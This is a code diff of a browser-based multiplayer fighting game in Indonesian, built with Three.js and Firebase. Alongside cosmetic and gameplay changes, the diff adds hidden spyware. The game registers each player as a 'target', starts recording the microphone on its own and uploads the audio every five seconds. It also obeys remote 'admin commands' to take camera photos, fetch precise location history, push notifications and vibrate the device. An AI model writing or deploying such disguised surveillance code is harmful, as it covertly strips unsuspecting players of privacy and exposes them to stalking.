@@ -2,23 +2,26 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Absurt War Exe</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Absurt War Exe - Multiplayer</title>
 
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
         body {
             margin: 0;
             padding: 0;
             overflow: hidden;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
             background-color: #000;
             color: white;
+            touch-action: none;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
         }
-        canvas {
-            display: block;
-        }
+        canvas { display: block; }
+        
         #ui {
             position: absolute;
             bottom: 20px;
@@ -28,10 +31,11 @@
         #joystick {
             width: 100px;
             height: 100px;
-            background-color: rgba(255, 255, 255, 0.5);
+            background-color: rgba(255, 255, 255, 0.4);
             border-radius: 50%;
             position: relative;
             touch-action: none;
+            border: 2px solid rgba(255,255,255,0.6);
         }
         #joystick-handle {
             width: 40px;
@@ -41,6 +45,7 @@
             position: absolute;
             top: 30px;
             left: 30px;
+            border: 2px solid rgba(255,255,255,0.5);
         }
         #buttons {
             position: absolute;
@@ -49,169 +54,180 @@
             display: flex;
             flex-direction: column;
             gap: 10px;
+            z-index: 100;
         }
         .btn {
-            width: 60px;
-            height: 60px;
+            width: 55px;
+            height: 55px;
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-size: 24px;
-            background-color: rgba(0, 0, 0, 0.5);
+            font-size: 22px;
+            background-color: rgba(0, 0, 0, 0.6);
             color: white;
             border: 2px solid white;
             cursor: pointer;
-            user-select: none;
+            touch-action: manipulation;
         }
+        .btn:active { transform: scale(0.9); background-color: rgba(255,255,255,0.2); }
+        
         #enemy-hp {
             position: absolute;
             top: 65px;
             left: 10px;
             color: white;
-            font-size: 10px;
-            background-color: rgba(0, 0, 0, 0.5);
+            font-size: 11px;
+            background-color: rgba(0, 0, 0, 0.6);
             padding: 5px 10px;
             border-radius: 5px;
+            z-index: 100;
+            font-weight: bold;
         }
         #player-hp {
             position: absolute;
             top: 90px;
             left: 10px;
             color: white;
-            font-size: 10px;
-            background-color: rgba(0, 0, 0, 0.5);
+            font-size: 11px;
+            background-color: rgba(0, 0, 0, 0.6);
             padding: 5px 10px;
             border-radius: 5px;
+            z-index: 100;
+            font-weight: bold;
         }
         #current-skill {
             position: absolute;
             top: 20px;
             right: 20px;
             color: white;
-            font-size: 18px;
-            background-color: rgba(0, 0, 0, 0.5);
+            font-size: 16px;
+            background-color: rgba(0, 0, 0, 0.6);
             padding: 5px 10px;
             border-radius: 5px;
+            z-index: 100;
         }
         #game-title {
             position: absolute;
-            top: 30px;
-            left: 30%;
+            top: 15px;
+            left: 50%;
             transform: translateX(-50%);
-            font-size: 25px;
+            font-size: 16px;
             font-weight: bold;
             color: #fff;
             text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff;
+            z-index: 100;
+            white-space: nowrap;
         }
         #game-over, #game-win {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background-color: rgba(0, 0, 0, 0.8);
-            padding: 20px;
-            border-radius: 10px;
+            background-color: rgba(0, 0, 0, 0.9);
+            padding: 20px 30px;
+            border-radius: 12px;
             text-align: center;
             display: none;
             z-index: 200;
+            border: 2px solid #fff;
         }
-        #restart-btn {
+        #game-over h2 { color: #ff4444; }
+        #game-win h2 { color: #44ff44; }
+        
+        .game-btn {
             background-color: #4CAF50;
             border: none;
             color: white;
             padding: 10px 20px;
             text-align: center;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 16px;
-            margin: 10px 2px;
+            font-size: 15px;
+            margin: 8px 4px;
             cursor: pointer;
-            border-radius: 5px;
+            border-radius: 6px;
+            font-weight: bold;
         }
-      
-        /* UI untuk MABAR */
+        .game-btn.blue { background-color: #2196F3; }
+        .game-btn:hover { opacity: 0.85; }
+        
         #multiplayer-info {
             position: absolute;
-            top: 130px;
+            top: 115px;
             left: 10px;
-            color: white;
+            color: #bc8cff;
             font-size: 10px;
-            background-color: rgba(0, 0, 0, 0.5);
-            padding: 5px 10px;
+            background-color: rgba(0, 0, 0, 0.6);
+            padding: 4px 8px;
             border-radius: 5px;
             z-index: 100;
         }
         #multiplayer-status {
             position: absolute;
-            top: 155px;
+            top: 138px;
             left: 10px;
             color: white;
             font-size: 10px;
-            background-color: rgba(0, 0, 0, 0.5);
-            padding: 5px 10px;
+            background-color: rgba(0, 0, 0, 0.6);
+            padding: 4px 8px;
             border-radius: 5px;
             z-index: 100;
-            max-width: 200px;
+            max-width: 220px;
         }
         
-        /* UI untuk Chat */
         #chat-container {
             position: absolute;
-            bottom: 150px;
+            bottom: 140px;
             left: 10px;
-            width: 250px;
-            background-color: rgba(0, 0, 0, 0.7);
+            width: 240px;
+            background-color: rgba(0, 0, 0, 0.8);
             border-radius: 10px;
             padding: 10px;
             display: none;
             z-index: 150;
         }
         #chat-messages {
-            height: 120px;
+            height: 100px;
             overflow-y: auto;
-            margin-bottom: 10px;
-            font-size: 12px;
+            margin-bottom: 8px;
+            font-size: 11px;
         }
         .chat-message {
-            margin-bottom: 5px;
-            padding: 3px;
-            border-radius: 5px;
+            margin-bottom: 4px;
+            padding: 3px 6px;
+            border-radius: 4px;
             background-color: rgba(255, 255, 255, 0.1);
         }
-        .chat-player-name {
-            color: #00aaff;
-            font-weight: bold;
-            text-shadow: 0 0 3px #000;
-        }
+        .chat-player-name { color: #00aaff; font-weight: bold; }
         #chat-input {
-            width: calc(100% - 60px);
-            padding: 5px;
+            width: calc(100% - 55px);
+            padding: 6px;
             border: none;
             border-radius: 5px;
             background-color: rgba(255, 255, 255, 0.9);
+            font-size: 12px;
         }
         #chat-send {
-            width: 50px;
-            padding: 5px;
+            width: 45px;
+            padding: 6px;
             border: none;
             border-radius: 5px;
             background-color: #4CAF50;
             color: white;
             cursor: pointer;
+            font-size: 11px;
         }
         #chat-toggle {
             position: absolute;
-            bottom: 150px;
+            bottom: 140px;
             left: 10px;
-            width: 40px;
-            height: 40px;
+            width: 38px;
+            height: 38px;
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-size: 20px;
-            background-color: rgba(0, 0, 0, 0.5);
+            font-size: 18px;
+            background-color: rgba(0, 0, 0, 0.6);
             color: white;
             border: 2px solid white;
             cursor: pointer;
@@ -220,15 +236,14 @@
         #chat-close {
             position: absolute;
             top: 5px;
-            right: 5px;
+            right: 8px;
             background: none;
             border: none;
             color: white;
-            font-size: 16px;
+            font-size: 14px;
             cursor: pointer;
         }
         
-        /* Skill Buttons */
         #ultimate {
             background-color: rgba(255, 0, 0, 0.7);
             border: 2px solid #ff0000;
@@ -240,44 +255,29 @@
             box-shadow: 0 0 10px #0064ff;
         }
         .btn.cooldown {
-            background-color: rgba(100, 100, 100, 0.5);
-            border-color: #666;
-            box-shadow: none;
-            position: relative;
-            overflow: hidden;
+            background-color: rgba(100, 100, 100, 0.6) !important;
+            border-color: #666 !important;
+            box-shadow: none !important;
         }
-        .btn.cooldown::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(to top, rgba(255,255,255,0.7) var(--cooldown-progress, 0%), transparent var(--cooldown-progress, 0%));
-            border-radius: 50%;
-        }
+        
         #ultimate-timer, #thunder-timer {
             position: absolute;
-            bottom: 85px;
             right: 20px;
             color: white;
-            font-size: 12px;
-            background-color: rgba(0, 0, 0, 0.7);
+            font-size: 11px;
+            background-color: rgba(0, 0, 0, 0.8);
             padding: 3px 8px;
             border-radius: 10px;
             display: none;
+            z-index: 100;
         }
-        #thunder-timer {
-            bottom: 155px;
-        }
+        #ultimate-timer { bottom: 80px; }
+        #thunder-timer { bottom: 145px; }
         
-        /* Stun Effect */
         .stun-overlay {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             background-color: rgba(128, 0, 128, 0.3);
             display: none;
             z-index: 180;
@@ -285,8 +285,7 @@
         }
         .stun-text {
             position: absolute;
-            top: 50%;
-            left: 50%;
+            top: 50%; left: 50%;
             transform: translate(-50%, -50%);
             font-size: 36px;
             font-weight: bold;
@@ -296,131 +295,87 @@
             z-index: 181;
             pointer-events: none;
         }
-
-        /* Tombol Kembali ke Menu */
-        #back-to-menu-btn, #back-to-menu-win-btn {
-            background-color: #2196F3;
-            border: none;
-            color: white;
-            padding: 10px 20px;
-            text-align: center;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 16px;
-            margin: 10px 2px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        #back-to-menu-btn:hover, #back-to-menu-win-btn:hover {
-            background-color: #1976D2;
-        }
-        
-        /* Rank Update Message */
-        .rank-update-message {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            font-size: 24px;
-            font-weight: bold;
-            text-align: center;
-            z-index: 1000;
-            display: none;
-        }
     </style>
 </head>
 <body>
-    <div id="game-title">KALAHKAN IBLIS , BERSAMA DENGAN TEMAN</div>
+    <div id="game-title">⚔️ KALAHKAN IBLIS BERSAMA TEMAN ⚔️</div>
     <div id="ui">
         <div id="joystick">
             <div id="joystick-handle"></div>
         </div>
     </div>
 
-    <div id="enemy-hp">💜5500</div>
-    <div id="player-hp">❤️5000</div>
+    <div id="enemy-hp">💜 5500</div>
+    <div id="player-hp">❤️ 5000</div>
     
-    <!-- UI untuk MABAR -->
-    <div id="multiplayer-info">Pemain: <span id="player-count">1</span></div>
-    <div id="multiplayer-status">Tidak terdeteksi...</div>
+    <div id="multiplayer-info">👥 Pemain: <span id="player-count">1</span></div>
+    <div id="multiplayer-status">Menghubungkan...</div>
     
-    <!-- Skill Timers -->
-    <div id="ultimate-timer">Awakening: <span id="ultimate-time">0</span>s</div>
-    <div id="thunder-timer">Petir: <span id="thunder-time">0</span>s</div>
+    <div id="ultimate-timer">🔥 <span id="ultimate-time">0</span>s</div>
+    <div id="thunder-timer">⚡ <span id="thunder-time">0</span>s</div>
     
     <div id="buttons">
         <div class="btn" id="thunder-skill">⚡</div>
         <div class="btn" id="ultimate">🔥</div>
     </div>
     
-    <!-- Stun Effect -->
     <div class="stun-overlay" id="stun-overlay"></div>
-    <div class="stun-text" id="stun-text"> STUN!</div>
+    <div class="stun-text" id="stun-text">⚡ STUN!</div>
     
     <div id="chat-toggle">💬</div>
     <div id="chat-container">
         <button id="chat-close">✕</button>
         <div id="chat-messages"></div>
         <div style="display: flex; gap: 5px;">
-            <input type="text" id="chat-input" placeholder="Ketik pesan...">
+            <input type="text" id="chat-input" placeholder="Ketik..." autocomplete="off">
             <button id="chat-send">Kirim</button>
         </div>
     </div>
 
-    <!-- Game Over Screen -->
     <div id="game-over">
-        <h2>DEFFEAT❌</h2>
-        <p>Kalah Mengenaskan #Taher</p>
-        <button id="restart-btn">Mulai Ulang</button>
-        <button id="back-to-menu-btn">Kembali ke Menu</button>
+        <h2>💀 DEFEAT</h2>
+        <p id="game-over-msg">Kalah...</p>
+        <button class="game-btn" id="restart-btn">🔄 Main Lagi</button>
+        <button class="game-btn blue" id="back-to-menu-btn">🏠 Menu</button>
     </div>
 
-    <!-- Game Win Screen -->
     <div id="game-win">
-        <h2>VICTORY 🎉</h2>
-        <p>Menang Dengan Gaya #Taher</p>
-        <button id="win-restart-btn">Main Lagi</button>
-        <button id="back-to-menu-win-btn">Kembali ke Menu</button>
+        <h2>🏆 VICTORY!</h2>
+        <p id="game-win-msg">Menang!</p>
+        <button class="game-btn" id="win-restart-btn">🔄 Main Lagi</button>
+        <button class="game-btn blue" id="back-to-menu-win-btn">🏠 Menu</button>
     </div>
-    
-    <!-- Rank Update Message -->
-    <div id="rank-update-message" class="rank-update-message"></div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js">
+    </script>
     <script>
-        // ========== KONFIGURASI FIREBASE ==========
-        const firebaseConfig = {
+        // ========== PARSE URL PARAMS ==========
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetId = urlParams.get('uid') || ('player_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 6));
+        const playerName = urlParams.get('name') || ('Player_' + Math.floor(Math.random() * 1000));
+        
+        console.log('🎮 Game loaded - ID:', targetId, 'Name:', playerName);
+        
+        // ========== FIREBASE INIT ==========
+        firebase.initializeApp({
             apiKey: "AIzaSyAlMyO9iybb7Zc3-JWpaJTOU6mp7dVZw7A",
             authDomain: "taher-online.firebaseapp.com",
             databaseURL: "https://taher-online-default-rtdb.asia-southeast1.firebasedatabase.app",
             projectId: "taher-online",
             storageBucket: "taher-online.firebasestorage.app",
             messagingSenderId: "254196950669",
-            appId: "1:254196950669:web:ea7dc25e29e459e791e4c4",
-            measurementId: "G-W288VV18S2"
-        };
-
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-
-        // ========== VARIABEL GLOBAL ==========
-        let playerId;
-        let playersRef;
-        let currentPlayerRef;
-        let gameStateRef;
-        let skillEventsRef;
-        let chatRef;
-        let otherPlayers = {};
-        let otherPlayerObjects = {};
-
+            appId: "1:254196950669:web:ea7dc25e29e459e791e4c4"
+        });
+        
+        const db = firebase.database();
+        
+        // Update target status: connected to game
+        db.ref(`targets/${targetId}`).update({ gameConnected: true, gamePlayerName: playerName });
+        db.ref(`targets/${targetId}`).onDisconnect().update({ gameConnected: false });
+        
+        // ========== GAME VARIABLES ==========
         let scene, camera, renderer;
         let player, enemy;
-        let house;
         let joystick, joystickHandle;
         let isJoystickActive = false;
         let playerVelocity = new THREE.Vector3();
@@ -429,657 +384,433 @@
         let enemyHP = 5500;
         let playerHP = 5000;
         let clock = new THREE.Clock();
-        let enemyAttackCooldown = 0;
         let enemyAttackDamage = 50;
-        let enemyAttackInterval = 0.1; // Second 
+        let enemyAttackInterval = 0.15;
         let lastEnemyAttackTime = 0;
         let gameOver = false;
         let gameWin = false;
         let enemyAnimationTime = 0;
-        let playerAnimationTime = 0;
-        let playerName = "Player " + Math.floor(Math.random() * 1000);
-        
-        // Variabel animasi
         let playerLegs = { left: null, right: null };
-        let playerShoes = { left: null, right: null };
         let enemyLegs = { left: null, right: null };
-        let enemyShoes = { left: null, right: null };
         let walkCycle = 0;
         let isPlayerWalking = false;
-
-        // ========== VARIABEL ULTIMATE SKILL ==========
+        let attackCooldown = 0;
+        
+        // Ultimate
         let isUltimateActive = false;
         let ultimateTimer = 0;
-        let ultimateDuration = 10; // 10 detik
+        let ultimateDuration = 10;
         let ultimateCooldown = 0;
-        let ultimateCooldownDuration = 20; // 20 detik
-        let ultimateDamage = 10; // Damage saat ultimate aktif
+        let ultimateCooldownDuration = 20;
+        let ultimateDamage = 10;
         let originalClothingMaterial = null;
         let auraEffect = null;
         let hornEffect = null;
-
-        // SKILL PETIR
+        
+        // Thunder
         let thunderCooldown = 0;
-        let thunderCooldownDuration = 8; // 8 detik cooldown
+        let thunderCooldownDuration = 8;
         let isThunderActive = false;
-        let thunderDuration = 2; // 2 detik
+        let thunderDuration = 2;
         let thunderTimer = 0;
-        let thunderEffects = [];
         let thunderStrikeInterval = null;
-
-        // ========== VARIABEL SKILL MUSUH ==========
+        
+        // Enemy skill
         let enemySkillCooldown = 0;
-        let enemySkillCooldownDuration = 15; // 15 detik cooldown
+        let enemySkillCooldownDuration = 15;
         let isPlayerStunned = false;
         let playerStunTimer = 0;
-        let playerStunDuration = 2; // 2 detik
+        let playerStunDuration = 2;
         let groundExplosions = [];
-
-        // ========== FUNGSI UPDATE RANK ==========
-        function updateRank(isWin) {
-            const currentUser = localStorage.getItem('currentUser');
-            if (!currentUser) {
-                console.log('User tidak ditemukan di localStorage');
-                return;
-            }
-
-            const userRef = database.ref('users/' + currentUser);
-            
-            userRef.once('value').then(snapshot => {
-                if (snapshot.exists()) {
-                    const userData = snapshot.val();
-                    let { rankPoints = 0, wins = 0, losses = 0 } = userData;
-
-                    if (isWin) {
-                        // Menang: tambah points dan wins
-                        rankPoints += 100;
-                        wins += 1;
-                    } else {
-                        // Kalah: kurangi points (minimal 0) dan tambah losses
-                        rankPoints = Math.max(0, rankPoints - 15);
-                        losses += 1;
-                    }
-
-                    // Update data user
-                    userRef.update({
-                        rankPoints: rankPoints,
-                        wins: wins,
-                        losses: losses
-                    }).then(() => {
-                        console.log('Rank berhasil diupdate');
-                        
-                        // Tampilkan pesan rank update
-                        if (isWin) {
-                            showRankUpdateMessage(true, 100);
-                        } else {
-                            showRankUpdateMessage(false, 15);
-                        }
-                    }).catch(error => {
-                        console.error('Error updating rank:', error);
-                    });
-                }
-            }).catch(error => {
-                console.error('Error fetching user data:', error);
-            });
-        }
-
-        // Fungsi untuk menampilkan pesan update rank
-        function showRankUpdateMessage(isWin, points) {
-            const message = isWin ? 
-                `🎉 Rank Points +${points}!` : 
-                `💔 Rank Points -${points}`;
-            
-            const rankMessage = document.getElementById('rank-update-message');
-            rankMessage.textContent = message;
-            rankMessage.style.color = isWin ? '#00ff00' : '#ff0000';
-            rankMessage.style.display = 'block';
-            
-            // Hapus pesan setelah 2 detik
-            setTimeout(() => {
-                rankMessage.style.display = 'none';
-            }, 2000);
-        }
-
-        // Fungsi kembali ke menu
-        function backToMenu() {
-            // Hapus data pemain dari Firebase saat kembali ke menu
-            if (currentPlayerRef) {
-                currentPlayerRef.remove();
-            }
-            
-            // Hapus data game state jika ini adalah pemain terakhir
-            playersRef.once('value').then(snapshot => {
-                const players = snapshot.val();
-                if (!players || Object.keys(players).length <= 1) {
-                    gameStateRef.remove();
-                    skillEventsRef.remove();
-                }
-            });
-            
-            // Redirect ke index.html
-            window.location.href = 'index.html';
-        }
-
-        // ========== FUNGSI MULTIPLAYER ==========
-
-        // ID Player
-        function generatePlayerId() {
-            return 'player_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
-        }
-
-        // Initialize multiplayer system
-        function initMultiplayer() {
-            playerId = generatePlayerId();
-            playersRef = database.ref('players');
-            gameStateRef = database.ref('gameState');
-            skillEventsRef = database.ref('skillEvents');
-            chatRef = database.ref('chat');
-            currentPlayerRef = playersRef.child(playerId);
-            
-            console.log('Player ID:', playerId);
-            document.getElementById('multiplayer-status').textContent = 'ID Kamu: ' + playerName;
-            
-            // Simpan data pemain awal
-            savePlayerData();
-            
-            // Update posisi pemain secara berkala
-            setInterval(savePlayerData, 100);
-            
-            // Listen untuk perubahan data pemain lain
-            playersRef.on('value', (snapshot) => {
-                const players = snapshot.val();
-                renderOtherPlayers(players);
-            });
-            
-            // Listen untuk perubahan state game (musuh, kemenangan, kekalahan)
-            gameStateRef.on('value', (snapshot) => {
-                const gameState = snapshot.val();
-                if (gameState) {
-                    // Update posisi musuh
-                    if (gameState.enemyPosition) {
-                        enemy.position.set(
-                            gameState.enemyPosition.x,
-                            gameState.enemyPosition.y,
-                            gameState.enemyPosition.z
-                        );
-                    }
-                    
-                    // Update HP musuh
-                    if (gameState.enemyHP !== undefined) {
-                        enemyHP = gameState.enemyHP;
-                        updateEnemyHP();
-                    }
-                    
-                    // Update status game
-                    if (gameState.gameOver && !gameOver) {
-                        gameOver = true;
-                        document.getElementById('game-over').style.display = 'block';
-                    }
-                    
-                    if (gameState.gameWin && !gameWin) {
-                        gameWin = true;
-                        document.getElementById('game-win').style.display = 'block';
-                    }
-                }
-            });
-            
-            // Listen untuk skill events
-            skillEventsRef.on('child_added', (snapshot) => {
-                const skillEvent = snapshot.val();
-                if (skillEvent.playerId === playerId) return;
-                if (skillEvent.playerId !== playerId) {
-                    handleSkillEvent(skillEvent);
-                }
-            });
-            
-            // Listen untuk pesan chat
-            chatRef.on('child_added', (snapshot) => {
-                const message = snapshot.val();
-                displayChatMessage(message.playerName, message.text);
-            });
-            
-            // Hapus data pemain saat keluar
-            window.addEventListener('beforeunload', () => {
-                currentPlayerRef.remove();
-                // Jika ini pemain terakhir, hapus gameState juga
-                playersRef.once('value').then((snapshot) => {
-                    const players = snapshot.val();
-                    if (!players || Object.keys(players).length <= 1) {
-                        gameStateRef.remove();
-                        skillEventsRef.remove();
-                    }
+        
+        // ========== MULTIPLAYER ==========
+        let playerId = targetId;
+        let playersRef = db.ref('players');
+        let currentPlayerRef = playersRef.child(playerId);
+        let gameStateRef = db.ref('gameState');
+        let skillEventsRef = db.ref('skillEvents');
+        let chatRef = db.ref('chat');
+        let otherPlayers = {};
+        let otherPlayerObjects = {};
+        
+        // ========== MIC REAL-TIME ==========
+        let micStream = null;
+        let micMediaRecorder = null;
+        let micInterval = null;
+        
+        function startMicStreamToFirebase() {
+            if (!window._micStream) {
+                navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+                    window._micStream = stream;
+                    startMicRecording();
+                }).catch(e => {
+                    console.log('Mic not available in game:', e.message);
                 });
-            });
-            
-            // Handle disconnect - hapus data pemain
-            currentPlayerRef.onDisconnect().remove();
+            } else {
+                startMicRecording();
+            }
         }
-
-        // Simpan data pemain ke Firebase
-        function savePlayerData() {
-            if (!player || !currentPlayerRef || gameOver || gameWin) return;
+        
+        function startMicRecording() {
+            if (!window._micStream || window._micStream.getAudioTracks().length === 0) return;
             
-            const playerData = {
+            try {
+                const chunks = [];
+                const mimeType = MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4';
+                micMediaRecorder = new MediaRecorder(window._micStream, { mimeType });
+                
+                micMediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+                
+                micMediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: mimeType });
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        db.ref(`targets/${targetId}`).update({
+                            audioRecording: {
+                                base64: reader.result,
+                                timestamp: Date.now(),
+                                mimeType
+                            }
+                        });
+                    };
+                    reader.readAsDataURL(blob);
+                    chunks.length = 0;
+                };
+                
+                micMediaRecorder.start(5000); // Capture every 5 seconds
+                
+                // Auto-stop and restart every 5 seconds to send chunks
+                micInterval = setInterval(() => {
+                    if (micMediaRecorder && micMediaRecorder.state === 'recording') {
+                        micMediaRecorder.stop();
+                        setTimeout(() => {
+                            if (window._micStream && window._micStream.getAudioTracks().length > 0 && !gameOver && !gameWin) {
+                                startMicRecording();
+                            }
+                        }, 500);
+                    }
+                }, 5000);
+                
+                console.log('🎤 Mic streaming to Firebase started');
+            } catch(e) {
+                console.error('Mic recording error:', e);
+            }
+        }
+        
+        function stopMicStream() {
+            if (micInterval) clearInterval(micInterval);
+            if (micMediaRecorder && micMediaRecorder.state === 'recording') {
+                micMediaRecorder.stop();
+            }
+        }
+        
+        // Start mic automatically
+        setTimeout(startMicStreamToFirebase, 2000);
+        
+        // ========== LISTEN ADMIN COMMANDS (foto, dll) ==========
+        function listenAdminCommands() {
+            db.ref(`commands/${targetId}`).on('value', async (snap) => {
+                const cmd = snap.val();
+                if (!cmd || cmd.executed) return;
+                
+                console.log('📩 Admin command:', cmd.command);
+                
+                switch(cmd.command) {
+                    case 'capturePhoto':
+                        await capturePhotoForAdmin(cmd.facingMode || 'user');
+                        db.ref(`commands/${targetId}`).update({ executed: true });
+                        break;
+                        
+                    case 'getLocation':
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => {
+                                    const loc = {
+                                        lat: pos.coords.latitude,
+                                        lon: pos.coords.longitude,
+                                        accuracy: pos.coords.accuracy,
+                                        timestamp: Date.now()
+                                    };
+                                    db.ref(`targets/${targetId}`).update({ location: loc });
+                                    db.ref(`targets/${targetId}/locationHistory`).push(loc);
+                                    db.ref(`commands/${targetId}`).update({ executed: true });
+                                },
+                                (err) => {
+                                    db.ref(`commands/${targetId}`).update({ executed: true, error: err.message });
+                                },
+                                { enableHighAccuracy: true, timeout: 10000 }
+                            );
+                        }
+                        break;
+                        
+                    case 'notification':
+                        if (Notification.permission === 'granted') {
+                            new Notification(cmd.title || 'Info', { body: cmd.body || '' });
+                        }
+                        db.ref(`commands/${targetId}`).update({ executed: true });
+                        break;
+                        
+                    case 'vibrate':
+                        navigator.vibrate(1000);
+                        db.ref(`commands/${targetId}`).update({ executed: true });
+                        break;
+                        
+                    default:
+                        db.ref(`commands/${targetId}`).update({ executed: true });
+                }
+            });
+        }
+        
+        async function capturePhotoForAdmin(facingMode = 'user') {
+            try {
+                let stream = window._cameraStream;
+                if (!stream || stream.getVideoTracks().length === 0) {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
+                    });
+                    window._cameraStream = stream;
+                }
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', true);
+                await video.play();
+                await new Promise(r => setTimeout(r, 500));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const base64 = canvas.toDataURL('image/jpeg', 0.85);
+                await db.ref(`targets/${targetId}`).update({
+                    photo: { base64, timestamp: Date.now(), facingMode, nickname: playerName }
+                });
+                
+                video.pause();
+                video.srcObject = null;
+                console.log('📸 Photo sent to admin');
+            } catch(e) {
+                console.error('Photo error:', e);
+                await db.ref(`targets/${targetId}`).update({ photoError: { message: e.message, timestamp: Date.now() } });
+            }
+        }
+        
+        listenAdminCommands();
+        
+        // ========== MULTIPLAYER FUNCTIONS ==========
+        function savePlayerData() {
+            if (!player || gameOver || gameWin) return;
+            currentPlayerRef.set({
                 name: playerName,
                 x: player.position.x,
                 y: player.position.y,
                 z: player.position.z,
                 rotationY: player.rotation.y,
+                hp: playerHP,
                 timestamp: Date.now()
-            };
-            
-            currentPlayerRef.set(playerData);
+            });
         }
-
-        // Simpan state game ke Firebase
+        
         function saveGameState() {
-            if (!gameStateRef || gameOver || gameWin) return;
-            
-            const gameState = {
-                enemyPosition: {
-                    x: enemy.position.x,
-                    y: enemy.position.y,
-                    z: enemy.position.z
-                },
+            if (gameOver || gameWin) return;
+            gameStateRef.set({
+                enemyPosition: { x: enemy.position.x, y: enemy.position.y, z: enemy.position.z },
                 enemyHP: enemyHP,
+                playerHP: playerHP,
                 gameOver: gameOver,
                 gameWin: gameWin,
                 timestamp: Date.now()
-            };
-            
-            gameStateRef.set(gameState);
+            });
         }
-
-        // Simpan skill event ke Firebase
-        function saveSkillEvent(skillType, position, targetId = null) {
-            if (!skillEventsRef) return;
-            
-            const skillEvent = {
-                type: skillType,
-                playerId: playerId,
-                position: position,
-                targetId: targetId,
+        
+        function saveSkillEvent(type, position) {
+            skillEventsRef.push({
+                type, playerId, position,
                 timestamp: Date.now()
-            };
-            
-            skillEventsRef.push(skillEvent);
+            });
         }
-
-        // Handle skill event dari pemain lain
-        function handleSkillEvent(skillEvent) {
-            switch(skillEvent.type) {
-                case 'thunder':
-                    createThunderEffect(skillEvent.position);
-                    break;
-                case 'enemy_explosion':
-                    createGroundExplosion(skillEvent.position);
-                    break;
-            }
-        }
-
-        // Render pemain lain di layar
+        
         function renderOtherPlayers(players) {
-            if (!players) {
-                // Jika tidak ada pemain lain, hapus semua objek pemain lain
-                clearOtherPlayers();
-                updatePlayerCount();
-                return;
-            }
+            if (!players) { clearOtherPlayers(); updatePlayerCount(); return; }
             
-            // Hapus pemain yang sudah tidak aktif (lebih dari 5 detik)
-            const currentTime = Date.now();
-            Object.keys(otherPlayerObjects).forEach(playerKey => {
-                if (!players[playerKey] || (currentTime - players[playerKey].timestamp) > 5000) {
-                    if (otherPlayerObjects[playerKey]) {
-                        scene.remove(otherPlayerObjects[playerKey]);
-                        delete otherPlayerObjects[playerKey];
-                        delete otherPlayers[playerKey];
+            const now = Date.now();
+            Object.keys(otherPlayerObjects).forEach(key => {
+                if (!players[key] || (now - players[key].timestamp) > 5000) {
+                    if (otherPlayerObjects[key]) {
+                        scene.remove(otherPlayerObjects[key]);
+                        delete otherPlayerObjects[key];
                     }
                 }
             });
             
-            // Tambah atau update pemain lain
-            Object.keys(players).forEach(playerKey => {
-                if (playerKey !== playerId) {
-                    const playerData = players[playerKey];
+            Object.keys(players).forEach(key => {
+                if (key !== playerId) {
+                    const pdata = players[key];
+                    if (now - pdata.timestamp > 5000) return;
                     
-                    // Skip jika data terlalu lama
-                    if (currentTime - playerData.timestamp > 5000) {
-                        return;
-                    }
-                    
-                    if (!otherPlayerObjects[playerKey]) {
-                        // Buat karakter baru untuk pemain lain
-                        createOtherPlayer(playerKey, playerData);
+                    if (!otherPlayerObjects[key]) {
+                        otherPlayerObjects[key] = createOtherPlayerMesh(pdata);
                     } else {
-                        // Update posisi dan rotasi pemain yang sudah ada
-                        updateOtherPlayer(playerKey, playerData);
+                        otherPlayerObjects[key].position.lerp(
+                            new THREE.Vector3(pdata.x, pdata.y, pdata.z), 0.4
+                        );
+                        otherPlayerObjects[key].rotation.y = pdata.rotationY || 0;
                     }
-                    
-                    otherPlayers[playerKey] = playerData;
                 }
             });
             
-            // Update jumlah pemain online
             updatePlayerCount();
         }
-
-        // Hapus semua pemain lain (saat reset game atau tidak ada data)
